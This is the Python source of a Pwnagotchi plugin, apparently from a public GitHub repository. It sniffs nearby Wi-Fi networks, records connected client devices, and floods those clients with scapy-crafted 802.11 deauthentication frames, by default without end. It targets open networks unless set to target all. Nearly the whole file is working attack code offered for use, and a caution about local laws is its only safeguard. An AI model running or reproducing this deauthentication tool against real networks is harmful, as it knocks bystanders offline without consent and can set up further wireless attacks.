import logging
import pwnagotchi.plugins as plugins
from scapy.all import *
import threading
import time

class NetworkDeauther(plugins.Plugin):
    __author__ = 'avipars'
    __version__ = '0.0.2.2'
    __GitHub__ = "https://github.com/unitMeasure/pwn-plugins/"
    __license__ = 'GPL3'
    __description__ = 'A Pwnagotchi plugin to scan for Wi-Fi networks and deauth clients. Proceed with caution and ensure compliance with local laws.'

    def __init__(self):
        self.running = False
        self.interface = None
        self.networks = {}  # {BSSID: {ssid, channel, clients}}
        self.deauth_interval = 0.5
        self.deauth_count = None  # None for infinite
        self.deauth_loop = 1  # Infinite loop if count is None
        self.verbose = True
        self.only_open = True
        self.pos_x = 20
        self.pos_y = 100
        self.show_ui = True
        self.target_ssid = None

    def on_ui_setup(self, ui):
        if "show_ui" in self.options and self.options["show_ui"]:
            self.show_ui = True

            try:
                if "pos_x" in self.options:
                    self.pos_x = int(self.options.get("pos_x", 20)) 
                if "pos_y" in self.options:
                    self.pos_y = int(self.options.get("pos_y", 100))

                
                ui.add_element(
                    "deauth_networks",
                    LabeledValue(
                        color=BLACK,
                        label="",
                        value=f"[{self.__class__.__name__}]: Active",
                        position=(self.pos_x, self.pos_y),
                        label_font=fonts.Small,
                        text_font=fonts.Small,
                    ),
                )
            except Exception as e:
                logging.debug(f"[{self.__class__.__name__}]: Error on_ui_setup: {e}")

    def on_loaded(self):
        logging.info("[NetworkDeauther] Plugin loaded")
        self.interface = self.options.get('interface', 'wlan0mon')
        self.deauth_interval = float(self.options.get('interval', 0.1))
        self.deauth_count = int(self.options.get('count', 0)) or None
        self.verbose = self.options.get('verbose', True)
        self.target_ssid = self.options.get('target_ssid', None)  # Optional: limit to specific SSID

        if self.deauth_count == 0: # Infinite deauth
            self.deauth_loop = 1 
            self.deauth_count = None
        else:
            self.deauth_loop = 0
        logging.info(f"[NetworkDeauther] Config: interface={self.interface}, interval={self.deauth_interval}, count={self.deauth_count}, verbose={self.verbose}")

    def on_unload(self, ui):
        self.stop()
        logging.info("[NetworkDeauther] Plugin unloaded")

        if self.show_ui:
            with ui._lock:
                try:
                    ui.remove_element("deauth_networks")
                    logging.info(f"[{self.__class__.__name__}] plugin unloaded")
                except Exception as e:
                    logging.error(f"[{self.__class__.__name__}] unload: %s" % e)

    def on_ready(self, agent):
        logging.info("[NetworkDeauther] Plugin ready")

        if "only_open" in self.options and not self.options["only_open"]:
            logging.info("[NetworkDeauther] All network types will be targeted")
            self.only_open = False
        else:
            logging.info("[NetworkDeauther] Only open networks will be targeted")
            self.only_open = True
        
        self.start()

    def start(self):
        if not self.running:
            self.running = True
            logging.info("[NetworkDeauther] Starting open network scan and deauth")
            self.scan_thread = threading.Thread(target=self.scan_and_deauth)
            self.scan_thread.daemon = True
            self.scan_thread.start()

    def stop(self):
        if self.running:
            self.running = False
            logging.info("[NetworkDeauther] Stopping scan and deauth")
            self.scan_thread.join()

    def deauth(self, target_mac, gateway_mac):
        try:
            # Craft 802.11 deauth frame
            dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
            packet = RadioTap()/dot11/Dot11Deauth(reason=7)
            # Send the packet
            sendp(packet, inter=self.deauth_interval, count=self.deauth_count, loop=self.deauth_loop, iface=self.interface, verbose=self.verbose)
            if self.verbose:
                if self.deauth_count:
                    logging.info(f"[NetworkDeauther] Sent {self.deauth_count} deauth frames to {target_mac} on BSSID {gateway_mac}")
                else:
                    logging.info(f"[NetworkDeauther] Sending deauth frames to {target_mac} on BSSID {gateway_mac} indefinitely")
        except Exception as e:
            logging.error(f"[NetworkDeauther] Error sending deauth: {e}")

    def scan_and_deauth(self):
        def packet_handler(packet):
            # Handle beacon frames to find open networks
            if packet.haslayer(Dot11Beacon):
                bssid = packet[Dot11].addr2
                if bssid not in self.networks:
                    ssid = packet[Dot11Elt].info.decode('utf-8', 'ignore') if packet[Dot11Elt].info else '<Hidden>'
                    # Filter by target SSID if specified
                    if self.target_ssid and ssid != self.target_ssid:
                        return

                    encryption = self.get_encryption(packet)
                    
                    if encryption == 'Open' or not self.only_open:
                        channel = int(packet[Dot11Elt:3].info[0]) if packet[Dot11Elt:3].info else 0
                        self.networks[bssid] = {
                            'ssid': ssid,
                            'channel': channel,
                            'clients': set()  # Track client MACs
                        }
                        logging.info(f"[NetworkDeauther] Found open network: SSID={ssid}, BSSID={bssid}, Channel={channel}")
            # Handle data frames to find associated clients
            elif packet.haslayer(Dot11) and packet.type == 2:  # Data frames
                bssid = packet[Dot11].addr3
                if bssid in self.networks:
                    client = packet[Dot11].addr1 if packet[Dot11].FCfield & 0x2 else packet[Dot11].addr2
                    if client != bssid and client != 'ff:ff:ff:ff:ff:ff':
                        self.networks[bssid]['clients'].add(client)
                        logging.info(f"[NetworkDeauther] Found client {client} on BSSID {bssid}")

        try:
            while self.running:
                # Scan for networks and clients
                sniff(iface=self.interface, prn=packet_handler, timeout=10, store=0)
                # Deauth clients for each open network
                for bssid, info in self.networks.items():
                    for client in info['clients']:
                        if self.running:
                            self.deauth(client, bssid)
                            time.sleep(0.5)  # Small delay to avoid overwhelming the interface
        except Exception as e:
            logging.error(f"[NetworkDeauther] Error during scan/deauth: {e}")
            self.running = False

    def get_encryption(self, packet):
        cap = packet.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}")
        return 'Open' if 'privacy' not in cap else 'Encrypted'

    def on_ui_update(self, ui):
        if not self.show_ui:
            return

        if self.networks:
            network_list = [f"{info['ssid']} ({bssid}, {len(info['clients'])} clients)" for bssid, info in self.networks.items()]
            ui.set('deauth_networks', ', '.join(network_list[:3]))
        else:
            ui.set('deauth_networks', 'None')
